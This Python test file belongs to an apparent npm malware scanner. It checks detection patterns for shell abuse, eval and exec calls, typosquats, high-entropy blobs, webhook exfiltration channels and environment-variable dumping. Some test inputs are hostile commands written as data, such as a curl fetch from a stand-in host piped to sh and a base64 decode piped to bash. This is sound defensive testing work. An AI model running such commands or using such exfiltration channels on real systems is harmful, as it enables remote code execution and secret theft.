
from malwhunter.recon.catalog import (
    BULK_ENV_ENUMERATION,
    COMMAND_EXEC_CALL,
    EVAL_FAMILY_CALL,
    EXFIL_CHANNEL_PATTERN,
    SHELL_ABUSE_PATTERN,
    closest_typosquat_target,
    has_computed_arg,
    levenshtein,
    shannon_entropy,
)


def test_shell_abuse_pattern_matches_curl_pipe_sh():
    assert SHELL_ABUSE_PATTERN.search("curl http://evil.example/x.sh | sh")


def test_shell_abuse_pattern_matches_base64_decode_pipe_bash():
    assert SHELL_ABUSE_PATTERN.search("echo Zm9v | base64 -d | bash")


def test_shell_abuse_pattern_does_not_match_ordinary_install():
    assert not SHELL_ABUSE_PATTERN.search("node-gyp rebuild")
    assert not SHELL_ABUSE_PATTERN.search("npm run build")


def test_has_computed_arg_true_for_variable():
    m = EVAL_FAMILY_CALL.search("eval(decoded)")
    assert has_computed_arg(m) is True


def test_has_computed_arg_false_for_string_literal():
    m = EVAL_FAMILY_CALL.search('eval("1+1")')
    assert has_computed_arg(m) is False


def test_levenshtein_zero_for_identical():
    assert levenshtein("lodash", "lodash") == 0


def test_levenshtein_one_for_single_char_swap():
    assert levenshtein("lodash", "lodahs") == 2  # transposition costs 2 under simple edit distance


def test_closest_typosquat_target_flags_near_miss():
    assert closest_typosquat_target("lodashh") == "lodash"


def test_closest_typosquat_target_ignores_unrelated_name():
    assert closest_typosquat_target("my-companys-internal-utils") is None


def test_closest_typosquat_target_ignores_exact_popular_match():
    assert closest_typosquat_target("lodash") is None


def test_shannon_entropy_low_for_repetitive_text():
    assert shannon_entropy("aaaaaaaaaaaaaaaaaaaa") < 1.0


def test_shannon_entropy_high_for_base64_like_text():
    blob = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qgb2YgZW50cm9weQ=="
    assert shannon_entropy(blob) > 3.5


def test_command_exec_call_matches_exec_and_spawn():
    assert COMMAND_EXEC_CALL.search("child_process.exec(cmd)")
    assert COMMAND_EXEC_CALL.search("execSync(built)")
    assert COMMAND_EXEC_CALL.search("spawn(binary)")


def test_command_exec_computed_arg_true_for_variable():
    m = COMMAND_EXEC_CALL.search("exec(userSuppliedCommand)")
    assert has_computed_arg(m) is True


def test_command_exec_computed_arg_false_for_literal():
    m = COMMAND_EXEC_CALL.search('exec("ls -la")')
    assert has_computed_arg(m) is False


def test_exfil_channel_pattern_matches_discord_webhook():
    assert EXFIL_CHANNEL_PATTERN.search("https://discord.com/api/webhooks/123/abc")


def test_exfil_channel_pattern_matches_telegram_bot_api():
    assert EXFIL_CHANNEL_PATTERN.search("https://api.telegram.org/bot123:ABC/sendMessage")


def test_exfil_channel_pattern_does_not_match_unrelated_url():
    assert not EXFIL_CHANNEL_PATTERN.search("https://registry.npmjs.org/left-pad")


def test_bulk_env_enumeration_matches_object_keys():
    assert BULK_ENV_ENUMERATION.search("const vars = Object.keys(process.env)")


def test_bulk_env_enumeration_matches_json_stringify():
    assert BULK_ENV_ENUMERATION.search("JSON.stringify(process.env)")


def test_bulk_env_enumeration_does_not_match_single_named_read():
    assert not BULK_ENV_ENUMERATION.search("const token = process.env.NPM_TOKEN")
